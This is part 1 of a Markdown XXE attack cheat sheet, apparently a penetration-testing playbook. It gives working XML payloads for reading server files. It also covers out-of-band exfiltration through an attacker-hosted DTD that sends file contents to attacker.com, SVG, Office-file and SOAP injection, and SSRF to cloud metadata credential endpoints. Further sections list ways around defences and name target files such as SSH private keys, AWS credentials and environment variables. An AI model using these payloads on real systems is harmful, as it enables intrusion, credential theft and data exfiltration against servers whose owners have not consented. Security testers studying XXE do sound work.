# xxe-test · part 1

> 分段 1/2。完整索引见 `xxe-test.md`。

## 1. CLASSIC XXE PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

If `/etc/passwd` reflects in response → confirmed file read.

---
## 2. ATTACK SURFACE DISCOVERY

### Direct XML Inputs
- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)
- SVG uploads (SVG is XML)
- RSS/Atom feed parsers
- Web services with XML config import

### Non-Obvious XML Processing
Change `Content-Type` header on **any** JSON POST to:
```
Content-Type: application/xml
```
Then rewrite body as XML — many backends use dual-format parsers or auto-detect.

### PDF Generators
Some HTML→PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML.

---
## 3. OOB (OUT-OF-BAND) XXE — CRITICAL

Use when direct entity reflection fails (server parses but doesn't echo entity content):

### Step 1: Blind detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).

### Step 2: OOB file exfiltration via attacker-hosted DTD
**Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

**Payload sent to target**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
File contents appear in attacker's HTTP server request log.

### Step 3: Error-based OOB (alternative when HTTP blocked)
Use intentional error to leak data in error message:
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---
## 4. XXE FILE READ TARGETS

**Linux**:
```
/etc/passwd
/etc/shadow  (requires root)
/etc/hosts
/proc/self/environ      ← environment variables (DB creds, API keys)
/proc/self/cmdline      ← process command line
/var/log/apache2/access.log  ← may contain passwords in URLs
/home/USER/.ssh/id_rsa  ← SSH private key
/home/USER/.aws/credentials ← AWS keys
/home/USER/.bash_history
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET connection strings
C:\xampp\htdocs\wp-config.php    ← WordPress DB credentials
C:\Users\Administrator\.ssh\id_rsa
```

---
## 5. SVG XXE (file upload context)

When SVG uploads are accepted and served/processed:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
Upload as `.svg` → `GET /uploads/file.svg` → file contents in response.

---
## 6. OFFICE FILE XXE (docx/xlsx/pptx)

Office files are ZIP archives containing XML. Inject into `[Content_Types].xml` or `word/document.xml`:

```bash
# Step 1: extract
unzip original.docx -d extracted/

# Step 2: edit word/document.xml — add malicious DTD
# Add after <?xml version="1.0" encoding="UTF-8" standalone="yes"?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then use &xxe; inside document text

# Step 3: repackage
cd extracted && zip -r ../malicious.docx .
```

---
## 7. SOAP ENDPOINT XXE

SOAP requests parse XML by definition. Inject external entity into SOAP envelope:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---
## 8. XXE → SSRF CHAIN

XXE external entity can point to internal HTTP endpoints (identical to SSRF):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```
This combines XXE file read + SSRF into a single payload.

---
## 9. XInclude ATTACK

When server-side processes XInclude (import XML from another source), but you can't control the DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

Works in: Apache Cocoon, Xerces-J, libxml2 with XInclude support enabled.

---
## 10. PROTOCOL HANDLERS IN XXE

```xml
<!-- HTTP (SSRF) -->
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- File read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP wrapper (if PHP with libxml2) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Decode base64 in response to get file contents -->

<!-- FTP (exfil / port scan) -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">

<!-- Gopher (Redis, SMTP) -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---
## 11. BYPASSING DEFENSES

### Parser blocks DOCTYPE
Try XInclude (no DOCTYPE needed, see §9).

### Only allows specific XML schemas
If schema validation occurs: inject comments or CDATA after schema validation but before entity processing.

### Response encoding issues (binary in response)
Use PHP filter for base64:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Network restrictions on OOB
Use DNS-only OOB via `SYSTEM "file://HASH.attacker.com"` — no HTTP required, DNS lookup leaks data.

---
## 12. QUICK DETECTION CHECKLIST

```
□ Find XML input point (or JSON→XML transformation)
□ Send basic entity: <!ENTITY xxe "test"> → &xxe; in body → does "test" reflect?
□ If yes → file read: SYSTEM "file:///etc/passwd"
□ If no reflection → OOB test via Collaborator URL
□ If OOB hit → set up attacker DTD for file exfiltration
□ Try SVG upload with XXE
□ Try Content-Type: application/xml on JSON endpoints
□ Try XInclude if DOCTYPE-based fails
```

---
## 13. LOCAL DTD INJECTION (BLIND XXE AMPLIFICATION)

When external entities are blocked but local DTD files exist on the server:

### Technique

```xml
<!-- Override an entity defined in a LOCAL DTD file -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### Common Local DTD Paths

#### Linux

```
/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help
/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
/usr/share/nmap/nmap.dtd                    # Nmap
/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
```

> 本块超过 12KB，已拆分：后半部分见 [`xxe-test-p1-b.md`](xxe-test-p1-b.md)（从「Windows」起），按需只读该分段。
